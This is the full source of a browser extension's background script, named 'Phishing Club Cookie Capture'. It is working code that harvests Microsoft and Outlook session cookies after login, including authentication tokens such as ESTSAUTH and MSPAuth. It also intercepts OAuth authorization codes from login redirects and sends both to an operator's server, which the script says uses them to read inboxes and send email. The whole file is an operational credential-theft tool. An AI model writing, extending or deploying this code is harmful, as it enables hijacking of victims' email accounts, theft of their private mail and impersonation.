/**
 * Phishing Club — Cookie Capture Extension (Background Service Worker)
 *
 * Captures Microsoft/Outlook session cookies from the browser and sends them
 * to the Phishing Club server's cookie store for inbox reading and email sending.
 *
 * Endpoints used:
 *   GET  /api/extension/ping           — Health check
 *   POST /api/extension/cookies/save   — Send captured cookies to cookie store
 *   POST /api/extension/oauth/callback — Send captured OAuth codes
 */

const COOKIE_URLS = [
  'https://outlook.live.com/',
  'https://outlook.office365.com/',
  'https://outlook.office.com/',
  'https://login.live.com/',
  'https://login.microsoftonline.com/',
  'https://account.live.com/',
  'https://www.office.com/',
  'https://office365.com/',
  'https://m365.cloud.microsoft.com/',
  'https://substrate.office.com/',
  'https://live.com/',
];

const CRITICAL_COOKIES = [
  'X-OWA-CANARY', 'ClientId', 'UC', 'cadata', 'OutlookSession',
  'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
  'WLSSC', 'MSPAuth', 'MSPProf', 'MSPSoftVis',
  'MSRT', 'MSPRequ',
  'MSPOK', 'MSCC', 'OIDCAuthCookie',
  'SignInStateCookie',
];

const OAUTH_DOMAINS = [
  'login.microsoftonline.com',
  'login.live.com',
  'account.live.com'
];

const OAUTH_REDIRECT_PATTERNS = [
  'https://login.microsoftonline.com/common/oauth2/nativeclient',
  'https://login.live.com/oauth20_desktop.srf',
  'http://localhost'
];

let serverConnected = false;

// ── Extension installed ─────────────────────────────────────────────────────

chrome.runtime.onInstalled.addListener(() => {
  console.log('[PhishingClub] Cookie Capture extension installed');

  chrome.storage.local.set({
    enabled: true,
    autoCapture: true,
    autoCaptureOnLogin: true,
    notifications: true,
    capturedTokens: [],
    capturedCookies: [],
    serverUrl: ''
  });

  chrome.notifications.create({
    type: 'basic',
    iconUrl: 'icons/icon128.png',
    title: 'Phishing Club - Cookie Capture',
    message: 'Extension installed! Enter your server URL in the popup to connect.'
  });
});

// ── Watch for OAuth redirects ───────────────────────────────────────────────

chrome.tabs.onUpdated.addListener((tabId, changeInfo) => {
  if (changeInfo.url) {
    checkForOAuthCode(changeInfo.url, tabId);
    checkForOutlookLogin(changeInfo.url, tabId);
  }
});

chrome.webRequest.onBeforeRequest.addListener(
  (details) => checkForOAuthCode(details.url, details.tabId),
  { urls: ['https://login.microsoftonline.com/*', 'https://login.live.com/*', 'https://account.live.com/*'] }
);

// ── Auto-capture after Outlook login detection ─────────────────────────────

async function checkForOutlookLogin(url, tabId) {
  try {
    const settings = await chrome.storage.local.get(['enabled', 'autoCaptureOnLogin', 'serverUrl']);
    if (!settings.enabled || !settings.autoCaptureOnLogin || !settings.serverUrl) return;

    const outlookPatterns = [
      'https://outlook.live.com/mail/',
      'https://outlook.office365.com/mail/',
      'https://outlook.office.com/mail/',
      'https://outlook.live.com/owa/',
      'https://outlook.office365.com/owa/',
    ];

    const isOutlookMail = outlookPatterns.some(p => url.startsWith(p));
    if (!isOutlookMail) return;

    const lastCapture = await chrome.storage.local.get(['lastAutoCapture']);
    const now = Date.now();
    if (lastCapture.lastAutoCapture && (now - lastCapture.lastAutoCapture) < 300000) return;

    await chrome.storage.local.set({ lastAutoCapture: now });

    setTimeout(async () => {
      console.log('[PhishingClub] Auto-capturing cookies after Outlook login detected');
      const result = await captureCookies();
      if (result.success) {
        chrome.action.setBadgeText({ text: String(result.count) });
        chrome.action.setBadgeBackgroundColor({ color: '#4CAF50' });
        setTimeout(() => chrome.action.setBadgeText({ text: '' }), 5000);
      }
    }, 3000);

  } catch (err) {
    console.error('[PhishingClub] Auto-capture error:', err);
  }
}

// ── Check URL for an OAuth authorization code ───────────────────────────────

async function checkForOAuthCode(url, tabId) {
  try {
    const urlObj = new URL(url);

    const isOAuthDomain = OAUTH_DOMAINS.some(d => urlObj.hostname === d);
    const isRedirect = OAUTH_REDIRECT_PATTERNS.some(p => url.startsWith(p));

    if (!isOAuthDomain && !isRedirect) return;

    const code = urlObj.searchParams.get('code') || extractFromHash(urlObj.hash, 'code');
    if (!code) return;

    const settings = await chrome.storage.local.get(['enabled', 'autoCapture', 'notifications', 'serverUrl']);
    if (!settings.enabled) return;

    console.log('[PhishingClub] OAuth code captured:', code.substring(0, 30) + '...');

    const state = urlObj.searchParams.get('state') || extractFromHash(urlObj.hash, 'state');

    const tokenData = {
      code,
      state,
      url,
      timestamp: new Date().toISOString(),
      sent: false,
    };

    await saveToken(tokenData);

    if (settings.autoCapture && settings.serverUrl) {
      const result = await sendOAuthToServer(settings.serverUrl, tokenData);
      tokenData.sent = result.success;
      await updateLastTokenStatus(result.success);
    }

    if (settings.notifications) {
      chrome.notifications.create({
        type: 'basic',
        iconUrl: 'icons/icon128.png',
        title: tokenData.sent ? 'OAuth Code Sent!' : 'OAuth Code Captured',
        message: tokenData.sent
          ? 'Authorization code sent to your server successfully!'
          : settings.serverUrl
            ? 'Code captured but could not send to server. Check connection.'
            : 'Code captured! Set your server URL in the popup to auto-send.',
        priority: 2
      });
    }

    chrome.action.setBadgeText({ text: 'OK' });
    chrome.action.setBadgeBackgroundColor({ color: tokenData.sent ? '#4CAF50' : '#FF9800' });
    setTimeout(() => chrome.action.setBadgeText({ text: '' }), 5000);

  } catch (err) {
    console.error('[PhishingClub] Error checking URL for OAuth code:', err);
  }
}

function extractFromHash(hash, key) {
  if (!hash || hash.length < 2) return null;
  return new URLSearchParams(hash.substring(1)).get(key);
}

// ── Cookie Capture Engine ───────────────────────────────────────────────────

async function captureCookies() {
  const allCookies = [];
  const seenKeys = new Set();

  for (const url of COOKIE_URLS) {
    try {
      const cookies = await chrome.cookies.getAll({ url });
      for (const cookie of cookies) {
        const key = `${cookie.domain}|${cookie.name}|${cookie.path}`;
        if (!seenKeys.has(key)) {
          seenKeys.add(key);
          allCookies.push({
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            path: cookie.path,
            secure: cookie.secure,
            httpOnly: cookie.httpOnly,
            sameSite: cookie.sameSite || 'unspecified',
            expirationDate: cookie.expirationDate || 0,
            session: cookie.session || false,
          });
        }
      }
    } catch (err) {
      console.warn(`[PhishingClub] Failed to get cookies for ${url}:`, err);
    }
  }

  if (allCookies.length === 0) {
    return { success: false, count: 0, error: 'No Outlook cookies found. Are you signed into Outlook in this browser?' };
  }

  const foundCritical = allCookies.filter(c => CRITICAL_COOKIES.includes(c.name));
  const hasCriticalAuth = foundCritical.some(c =>
    ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'WLSSC', 'MSPAuth'].includes(c.name)
  );

  const domainGroups = {};
  for (const c of allCookies) {
    const d = c.domain.replace(/^\./, '');
    if (!domainGroups[d]) domainGroups[d] = [];
    domainGroups[d].push(c);
  }

  const captureEntry = {
    id: Date.now().toString(36),
    timestamp: new Date().toISOString(),
    cookies: allCookies,
    domainGroups,
    totalCount: allCookies.length,
    criticalCount: foundCritical.length,
    hasCriticalAuth,
    sent: false,
  };

  const result = await chrome.storage.local.get(['capturedCookies']);
  const captures = result.capturedCookies || [];
  captures.unshift(captureEntry);
  if (captures.length > 20) captures.splice(20);
  await chrome.storage.local.set({ capturedCookies: captures });

  console.log(`[PhishingClub] Captured ${allCookies.length} cookies (${foundCritical.length} critical) from ${Object.keys(domainGroups).length} domains`);

  const settings = await chrome.storage.local.get(['autoCapture', 'serverUrl', 'notifications']);
  if (settings.autoCapture && settings.serverUrl) {
    const sendResult = await sendCookiesToServer(settings.serverUrl, captureEntry);
    captureEntry.sent = sendResult.success;
    const updated = await chrome.storage.local.get(['capturedCookies']);
    const list = updated.capturedCookies || [];
    if (list.length > 0) {
      list[0].sent = sendResult.success;
      list[0].cookieStoreId = sendResult.cookieStoreId || '';
      await chrome.storage.local.set({ capturedCookies: list });
    }
  }

  if (settings.notifications) {
    const authStatus = hasCriticalAuth ? 'Auth tokens found' : 'Warning: No auth tokens';
    chrome.notifications.create({
      type: 'basic',
      iconUrl: 'icons/icon128.png',
      title: captureEntry.sent ? 'Cookies Sent to Server!' : 'Cookies Captured',
      message: `${allCookies.length} cookies from ${Object.keys(domainGroups).length} domains. ${authStatus}.`,
      priority: 2,
    });
  }

  return {
    success: true,
    count: allCookies.length,
    criticalCount: foundCritical.length,
    hasCriticalAuth,
    domains: Object.keys(domainGroups),
    sent: captureEntry.sent,
  };
}

// ── HTTP: Send captured cookies to Phishing Club ────────────────────────────

async function sendCookiesToServer(serverUrl, cookieData) {
  const base = serverUrl.replace(/\/+$/, '');
  const saveUrl = `${base}/api/extension/cookies/save`;

  try {
    const resp = await fetch(saveUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        cookies: cookieData.cookies,
        timestamp: cookieData.timestamp,
        domains: Object.keys(cookieData.domainGroups || {}),
        totalCount: cookieData.totalCount,
      }),
    });

    if (!resp.ok) {
      const text = await resp.text();
      console.error('[PhishingClub] Cookie save returned', resp.status, text);
      return { success: false, error: `Server returned ${resp.status}` };
    }

    const result = await resp.json();
    console.log('[PhishingClub] Cookie save response:', result);
    return {
      success: result.success === true,
      message: result.message,
      cookieStoreId: result.cookieStoreId || '',
    };
  } catch (err) {
    console.error('[PhishingClub] sendCookiesToServer failed:', err.message);
    return { success: false, error: err.message };
  }
}

// ── HTTP: Send OAuth code to Phishing Club ──────────────────────────────────

async function sendOAuthToServer(serverUrl, tokenData) {
  const base = serverUrl.replace(/\/+$/, '');
  const callbackUrl = `${base}/api/extension/oauth/callback`;

  try {
    const resp = await fetch(callbackUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ code: tokenData.code, state: tokenData.state }),
    });

    if (!resp.ok) {
      const text = await resp.text();
      console.error('[PhishingClub] OAuth callback returned', resp.status, text);
      return { success: false, error: `Server returned ${resp.status}` };
    }

    const result = await resp.json();
    return { success: result.success === true, message: result.message };
  } catch (err) {
    console.error('[PhishingClub] sendOAuthToServer failed:', err.message);
    return { success: false, error: err.message };
  }
}

// ── HTTP: Test server connection ────────────────────────────────────────────

async function testConnection(serverUrl) {
  const base = serverUrl.replace(/\/+$/, '');
  const pingUrl = `${base}/api/extension/ping`;

  try {
    const resp = await fetch(pingUrl, { method: 'GET' });
    if (!resp.ok) {
      serverConnected = false;
      return { success: false, error: `Server returned ${resp.status}` };
    }
    const data = await resp.json();
    serverConnected = data.success === true;
    return { success: serverConnected, message: data.message || 'Connected', version: data.version };
  } catch (err) {
    serverConnected = false;
    return { success: false, error: `Cannot reach server: ${err.message}` };
  }
}

// ── Local storage helpers ───────────────────────────────────────────────────

async function saveToken(tokenData) {
  const result = await chrome.storage.local.get(['capturedTokens']);
  const tokens = result.capturedTokens || [];
  tokens.unshift(tokenData);
  if (tokens.length > 50) tokens.splice(50);
  await chrome.storage.local.set({ capturedTokens: tokens });
}

async function updateLastTokenStatus(sent) {
  const result = await chrome.storage.local.get(['capturedTokens']);
  const tokens = result.capturedTokens || [];
  if (tokens.length > 0) {
    tokens[0].sent = sent;
    await chrome.storage.local.set({ capturedTokens: tokens });
  }
}

// ── Message handler (popup.js communication) ────────────────────────────────

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {

  if (request.action === 'getSettings') {
    chrome.storage.local.get(['enabled', 'autoCapture', 'autoCaptureOnLogin', 'notifications', 'serverUrl'], (r) => {
      sendResponse({ ...r, connected: serverConnected });
    });
    return true;
  }

  if (request.action === 'updateSettings') {
    chrome.storage.local.set(request.settings, () => sendResponse({ success: true }));
    return true;
  }

  if (request.action === 'testConnection') {
    testConnection(request.serverUrl)
      .then(r => sendResponse(r))
      .catch(e => sendResponse({ success: false, error: e.message }));
    return true;
  }

  if (request.action === 'captureCookies') {
    captureCookies()
      .then(r => sendResponse(r))
      .catch(e => sendResponse({ success: false, error: e.message }));
    return true;
  }

  if (request.action === 'getCapturedCookies') {
    chrome.storage.local.get(['capturedCookies'], (r) => {
      sendResponse({ cookies: r.capturedCookies || [] });
    });
    return true;
  }

  if (request.action === 'clearCookies') {
    chrome.storage.local.set({ capturedCookies: [] }, () => sendResponse({ success: true }));
    return true;
  }

  if (request.action === 'sendCookies') {
    sendCookiesToServer(request.serverUrl, request.cookieData)
      .then(r => sendResponse(r))
      .catch(e => sendResponse({ success: false, error: e.message }));
    return true;
  }

  if (request.action === 'getTokens') {
    chrome.storage.local.get(['capturedTokens'], (r) => {
      sendResponse({ tokens: r.capturedTokens || [] });
    });
    return true;
  }

  if (request.action === 'clearTokens') {
    chrome.storage.local.set({ capturedTokens: [] }, () => sendResponse({ success: true }));
    return true;
  }

  if (request.action === 'sendToken') {
    sendOAuthToServer(request.serverUrl, request.tokenData)
      .then(r => sendResponse(r))
      .catch(e => sendResponse({ success: false, error: e.message }));
    return true;
  }
});

console.log('[PhishingClub] Cookie Capture extension — background script loaded');
